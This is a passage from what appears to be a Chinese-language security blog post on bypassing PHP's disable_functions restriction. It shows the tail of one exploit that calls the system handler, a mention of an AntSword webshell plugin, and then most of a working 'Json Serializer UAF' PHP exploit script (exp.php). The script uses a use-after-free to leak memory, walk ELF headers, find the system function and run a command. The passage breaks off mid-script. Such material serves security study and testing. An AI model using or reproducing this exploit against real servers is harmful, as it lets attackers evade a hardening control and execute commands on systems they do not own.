punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150031808.png"></p><p>或者直接用蚁剑插件</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150031565.png"></p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令</p><p><code>exp.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"id"</span><span class="token punctuation">;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if you get segfaults</span><span class="token keyword">class</span> <span class="token class-name">MySplFixedArray</span> <span class="token keyword">extends</span> <span class="token class-name">SplFixedArray</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Z</span> <span class="token keyword">implements</span> <span class="token class-name">JsonSerializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># unable to leak ro segments</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">leak1</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$spl1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$spl1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># the real deal</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$spl1</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># fake reference zval</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># gc_refcounted</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># zval</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span> <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># type (string)</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$spl1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_Write</span>                <span class="token shell-comment comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'constant' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'bin2hex' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># system</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">leak2</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">jsonSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$y</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$spl1</span><span class="token punctuation">,</span> <span class="token variable">$fake_tbl_off</span><span class="token punctuation">,</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span>        <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateInterval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PT1S'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$room</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token variable">$room</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Z</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_protector</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateInterval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PT1S'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$protector</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".<span class="token interpolation"><span class="token variable">$_protector</span></span>"</span><span class="token punctuation">;</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateInterval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PT1S'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">d</span> <span class="token operator">=</span> <span class="token number">0x2000</span><span class="token punctuation">;</span>        <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">h</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># $this->abc is now of size 0x2000</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UAF failed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$spl1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySplFixedArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$spl2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySplFixedArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># some leaks</span>        <span class="token variable">$class_entry</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$handlers</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abc</span><span class="token punctuation">,</span> <span class="token number">0x128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 